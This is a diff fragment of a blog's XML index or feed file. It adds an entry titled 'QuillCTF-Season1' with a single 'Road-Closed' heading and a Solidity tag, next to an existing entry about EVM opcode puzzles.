+      <link href="/2024/01/15/QuillCTF-Season1/"/>
+      <url>/2024/01/15/QuillCTF-Season1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-Road-Closed"><a href="#1-Road-Closed" class="headerlink" title="1-Road-Closed"></a>1-Road-Closed</h1>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Solidity </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Opcode-EVM_PUZZLES</title>
       <link href="/2024/01/08/Opcode-EVM-PUZZLES/"/>
       <url>/2024/01/08/Opcode-EVM-PUZZLES/</url>
